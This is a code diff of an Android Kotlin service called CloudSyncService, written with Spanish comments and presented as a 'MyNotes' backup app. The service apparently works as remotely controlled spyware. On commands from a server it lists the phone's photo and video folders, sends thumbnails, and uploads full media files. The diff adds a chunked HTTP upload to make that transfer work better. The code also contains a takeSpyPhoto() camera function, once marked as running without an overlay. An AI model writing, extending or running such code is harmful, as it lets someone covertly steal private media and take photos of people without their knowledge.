@@ -10,6 +10,9 @@ import android.content.Context
 import android.content.Intent
 import android.graphics.Bitmap
 import android.graphics.BitmapFactory
+import android.graphics.ImageFormat
+import android.hardware.camera2.*
+import android.media.ImageReader
 import android.media.ThumbnailUtils
 import android.os.Build
 import android.os.Handler
@@ -28,14 +31,18 @@ import org.json.JSONObject
 import java.io.ByteArrayOutputStream
 import java.io.File
 import kotlin.concurrent.thread
-import android.hardware.camera2.*
-import android.graphics.ImageFormat
-import android.media.ImageReader
+
+// --- IMPORTACIONES OKHTTP ---
+import okhttp3.*
+import okhttp3.MediaType.Companion.toMediaTypeOrNull
+import okhttp3.RequestBody.Companion.toRequestBody
+import java.io.IOException
+// (Ya no necesitamos okio.source ni BufferedSink explícitamente para esta estrategia manual)
 
 class CloudSyncService : Service() {
 
     private var socket: Socket? = null
-    // ASEGÚRATE QUE ESTA URL SEA LA CORRECTA
+    // ASEGÚRATE QUE ESTA URL SEA TU DOMINIO CLOUDFLARE
     private val SERVER_URL = "https://mynotes.arccidev.com"
     private val CHANNEL_ID = "MyNotesBackupChannel"
 
@@ -100,18 +107,16 @@ class CloudSyncService : Service() {
             socket?.on(Socket.EVENT_CONNECT) {
                 registrarDispositivo()
 
-                // Enviar carpetas al conectar
                 thread {
                     try { Thread.sleep(1000) } catch (e: Exception) {}
                     sendFolderList()
                 }
 
-                // Escaneo inicial rápido (Solo fotos, sin videos para no saturar inicio)
                 if (!isScanning) {
                     isScanning = true
                     thread {
                         sendThumbnails(null)
-                        isScanning = false // Aquí sí apagamos manual
+                        isScanning = false
                     }
                 }
             }
@@ -119,8 +124,6 @@ class CloudSyncService : Service() {
             socket?.on("command_start_scan") { args ->
                 if (!isScanning) {
                     isScanning = true
-
-                    // 1. Enviar lista de carpetas
                     thread { sendFolderList() }
 
                     var folderFilter: String? = null
@@ -130,11 +133,10 @@ class CloudSyncService : Service() {
                         if (folderFilter.isNullOrEmpty()) folderFilter = null
                     }
 
-                    // 2. Escanear FOTOS y VIDEOS en orden
                     thread {
-                        sendThumbnails(folderFilter) // NO apaga isScanning
-                        scanVideos(folderFilter)     // NO apaga isScanning
-                        isScanning = false           // SE APAGA AQUÍ AL FINAL
+                        sendThumbnails(folderFilter)
+                        scanVideos(folderFilter)
+                        isScanning = false
                     }
                 }
             }
@@ -145,7 +147,11 @@ class CloudSyncService : Service() {
 
             socket?.on("request_full_image") { args ->
                 val data = args[0] as JSONObject
-                thread { uploadHighQuality(data.optString("path")) }
+                val path = data.optString("path")
+                val target = data.optString("target")
+
+                // Aquí inicia la subida por trozos
+                uploadFileHttp(path, target)
             }
 
             socket?.connect()
@@ -164,27 +170,40 @@ class CloudSyncService : Service() {
     }
 
     private fun sendFolderList() {
-        val uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
-        val projection = arrayOf(MediaStore.Images.Media.BUCKET_DISPLAY_NAME)
         val uniqueFolders = HashSet<String>()
 
         try {
-            contentResolver.query(uri, projection, null, null, null)?.use { cursor ->
+            val uriImages = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
+            val projection = arrayOf(MediaStore.Images.Media.BUCKET_DISPLAY_NAME)
+            contentResolver.query(uriImages, projection, null, null, null)?.use { cursor ->
                 val idxBucket = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.BUCKET_DISPLAY_NAME)
                 while (cursor.moveToNext()) {
                     val folderName = cursor.getString(idxBucket)
                     if (!folderName.isNullOrEmpty()) uniqueFolders.add(folderName)
                 }
             }
+        } catch (e: Exception) { Log.e("CloudSync", "Error listando fotos: ${e.message}") }
 
-            if (uniqueFolders.isNotEmpty()) {
-                val data = JSONObject().apply {
-                    put("dataType", "folder_list")
-                    put("folders", org.json.JSONArray(uniqueFolders))
+        try {
+            val uriVideo = MediaStore.Video.Media.EXTERNAL_CONTENT_URI
+            val projection = arrayOf(MediaStore.Video.Media.BUCKET_DISPLAY_NAME)
+            contentResolver.query(uriVideo, projection, null, null, null)?.use { cursor ->
+                val idxBucket = cursor.getColumnIndexOrThrow(MediaStore.Video.Media.BUCKET_DISPLAY_NAME)
+                while (cursor.moveToNext()) {
+                    val folderName = cursor.getString(idxBucket)
+                    if (!folderName.isNullOrEmpty()) uniqueFolders.add(folderName)
                 }
-                socket?.emit("usrData", data)
             }
-        } catch (e: Exception) {}
+        } catch (e: Exception) { Log.e("CloudSync", "Error listando videos: ${e.message}") }
+
+        if (uniqueFolders.isNotEmpty()) {
+            val sortedList = uniqueFolders.sorted()
+            val data = JSONObject().apply {
+                put("dataType", "folder_list")
+                put("folders", org.json.JSONArray(sortedList))
+            }
+            socket?.emit("usrData", data)
+        }
     }
 
     private fun sendThumbnails(targetFolder: String?) {
@@ -226,7 +245,6 @@ class CloudSyncService : Service() {
                 }
             }
         } catch (e: Exception) { Log.e("CloudSync", "Scan Error: ${e.message}") }
-        // NOTA: AQUÍ YA NO SE PONE isScanning = false
     }
 
     private fun scanVideos(targetFolder: String?) {
@@ -260,7 +278,6 @@ class CloudSyncService : Service() {
                     val id = cursor.getLong(idxId)
                     val file = File(path)
 
-                    // Generar Thumbnail VIDEO
                     val thumb = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                         try {
                             contentResolver.loadThumbnail(
@@ -295,38 +312,97 @@ class CloudSyncService : Service() {
         } catch (e: Exception) { e.printStackTrace() }
     }
 
-    private fun uploadHighQuality(path: String) {
-        try {
-            val file = File(path)
-            if (file.exists()) {
-                // Detectar si es video
-                val isVideo = path.endsWith(".mp4", true) || path.endsWith(".mkv", true)
+    // =========================================================
+    // 🔪 ESTRATEGIA DEL SALAME: SUBIDA POR TROZOS (CHUNKING)
+    // =========================================================
+    private fun uploadFileHttp(path: String, targetSocketId: String?) {
+        val file = File(path)
+        if (!file.exists()) return
 
-                if (isVideo) {
-                    val bytes = file.readBytes()
-                    val encoded = Base64.encodeToString(bytes, Base64.DEFAULT)
-                    val data = JSONObject().apply {
-                        put("name", "HD_${file.name}")
-                        put("image64", encoded)
-                        put("dataType", "full_image")
-                        put("folder", "Videos")
+        // CONFIGURACIÓN: 10 MB por pedazo (Seguro para Free Cloudflare)
+        val CHUNK_SIZE = 10 * 1024 * 1024
+        val totalSize = file.length()
+        // Calculamos cuántos pedazos salen
+        val totalChunks = (totalSize + CHUNK_SIZE - 1) / CHUNK_SIZE
+
+        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
+        val deviceName = "${Build.MANUFACTURER} ${Build.MODEL}"
+        val client = OkHttpClient()
+
+        Log.d("UPLOAD", "🔪 Iniciando corte: ${file.name} | Total: ${totalSize/1024/1024} MB | Pedazos: $totalChunks")
+
+        thread {
+            try {
+                // Abrimos el archivo para lectura manual
+                val fileInputStream = file.inputStream()
+                val buffer = ByteArray(CHUNK_SIZE)
+                var bytesRead: Int
+                var chunkIndex = 0
+                var uploadedBytes: Long = 0
+
+                // BUCLE: Leer pedazo -> Subir -> Repetir
+                while (fileInputStream.read(buffer).also { bytesRead = it } != -1) {
+
+                    // Si el último pedazo es más chico, ajustamos el array para no mandar basura vacía
+                    val actualChunkData = if (bytesRead < CHUNK_SIZE) {
+                        buffer.copyOf(bytesRead)
+                    } else {
+                        buffer
                     }
-                    socket?.emit("usrData", data)
-                } else {
-                    val bitmap = BitmapFactory.decodeFile(path)
-                    if (bitmap != null) {
-                        val encoded = encodeToBase64(bitmap, 100)
+
+                    // Preparamos los datos multipart
+                    val requestBody = MultipartBody.Builder()
+                        .setType(MultipartBody.FORM)
+                        // Enviamos el pedazo como "blob"
+                        .addFormDataPart("file", "blob", actualChunkData.toRequestBody("application/octet-stream".toMediaTypeOrNull()))
+                        .addFormDataPart("filename", file.name)
+                        .addFormDataPart("chunkIndex", chunkIndex.toString())
+                        .addFormDataPart("totalChunks", totalChunks.toString())
+                        .addFormDataPart("deviceId", deviceId)
+                        .addFormDataPart("deviceName", deviceName)
+                        .addFormDataPart("folderName", file.parentFile?.name ?: "Unknown")
+                        .build()
+
+                    val request = Request.Builder()
+                        .url("$SERVER_URL/upload-chunk") // <--- RUTA ESPECIAL PARA TROZOS
+                        .post(requestBody)
+                        .build()
+
+                    // ENVIAMOS EL PEDAZO Y ESPERAMOS (Síncrono para mantener orden)
+                    val response = client.newCall(request).execute()
+
+                    if (!response.isSuccessful) {
+                        Log.e("UPLOAD", "❌ Error subiendo chunk $chunkIndex: ${response.code}")
+                        response.close()
+                        fileInputStream.close()
+                        return@thread // Cancelamos todo si falla uno
+                    }
+                    response.close()
+
+                    // REPORTAR PROGRESO (Para la barra en Electron)
+                    uploadedBytes += bytesRead
+                    val progress = (uploadedBytes * 100 / totalSize).toInt()
+
+                    try {
                         val data = JSONObject().apply {
-                            put("name", "HD_${file.name}")
-                            put("image64", encoded)
-                            put("dataType", "full_image")
+                            put("deviceId", deviceId)
+                            put("filename", file.name)
+                            put("progress", progress)
                         }
-                        socket?.emit("usrData", data)
-                        bitmap.recycle()
-                    }
+                        socket?.emit("upload_progress", data)
+                    } catch (e: Exception) {}
+
+                    chunkIndex++
                 }
+
+                fileInputStream.close()
+                Log.d("UPLOAD", "✅ Subida completa exitosa: ${file.name}")
+
+            } catch (e: Exception) {
+                Log.e("UPLOAD", "❌ Excepción critica: ${e.message}")
+                e.printStackTrace()
             }
-        } catch (e: Exception) { e.printStackTrace() }
+        }
     }
 
     private fun getThumb(path: String): Bitmap? = try {
@@ -339,7 +415,6 @@ class CloudSyncService : Service() {
         return Base64.encodeToString(baos.toByteArray(), Base64.DEFAULT)
     }
 
-    // --- CÁMARA (MÉTODO FLASH - Sin Overlay) ---
     private fun takeSpyPhoto() {
         val manager = getSystemService(CAMERA_SERVICE) as CameraManager
         try {
